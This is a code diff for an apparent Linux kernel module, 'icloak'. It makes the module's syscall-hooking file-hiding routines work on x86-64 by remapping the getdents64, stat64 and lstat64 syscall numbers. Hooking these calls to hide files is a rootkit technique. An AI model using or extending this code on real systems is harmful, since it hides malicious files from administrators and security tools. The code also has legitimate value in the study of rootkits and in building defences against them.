@@ -14,6 +14,16 @@
 #include <utils/memory.h>
 #include <kook.h>
 
+#if defined(CONFIG_X86_64)
+# define __ICLOAK__NR_getdents64 __NR_getdents
+# define __ICLOAK__NR_stat64 __NR_stat
+# define __ICLOAK__NR_lstat64 __NR_lstat
+#else
+# define __ICLOAK__NR_getdents64 __NR_getdents64
+# define __ICLOAK__NR_stat64 __NR_stat64
+# define __ICLOAK__NR_lstat64 __NR_lstat64
+#endif
+
 static struct list_head *g_modules = NULL;
 
 static struct module *find_lkm(const char *name);
@@ -133,15 +143,15 @@ int native_hide_file(const char *pattern) {
     // INFO(Rafael): Performing the syscall hookings if it was not done before.
 
     if (getdents64_syscall == NULL) {
-        kook(__NR_getdents64, icloak_getdents64, (void **)&getdents64_syscall);
+        kook(__ICLOAK__NR_getdents64, icloak_getdents64, (void **)&getdents64_syscall);
     }
 
     if (stat64_syscall == NULL) {
-        kook(__NR_stat64, icloak_stat64, (void **)&stat64_syscall);
+        kook(__ICLOAK__NR_stat64, icloak_stat64, (void **)&stat64_syscall);
     }
 
     if (lstat64_syscall == NULL) {
-        kook(__NR_lstat64, icloak_lstat64, (void **)&lstat64_syscall);
+        kook(__ICLOAK__NR_lstat64, icloak_lstat64, (void **)&lstat64_syscall);
     }
 
     lock_hidden_patterns_mutex(return 1);
@@ -168,19 +178,19 @@ int native_show_file(const char *pattern) {
     if (g_icloak_hidden_patterns == NULL) {
         // INFO(Rafael): Having an empty list we can undo the sycall hookings.
         if (getdents64_syscall != NULL) {
-            if (kook(__NR_getdents64, getdents64_syscall, NULL) == 0) {
+            if (kook(__ICLOAK__NR_getdents64, getdents64_syscall, NULL) == 0) {
                 getdents64_syscall = NULL;
             }
         }
 
         if (stat64_syscall != NULL) {
-            if (kook(__NR_stat64, stat64_syscall, NULL) == 0) {
+            if (kook(__ICLOAK__NR_stat64, stat64_syscall, NULL) == 0) {
                 stat64_syscall = NULL;
             }
         }
 
         if (lstat64_syscall != NULL) {
-            if (kook(__NR_lstat64, lstat64_syscall, NULL) == 0) {
+            if (kook(__ICLOAK__NR_lstat64, lstat64_syscall, NULL) == 0) {
                 lstat64_syscall = NULL;
             }
         }
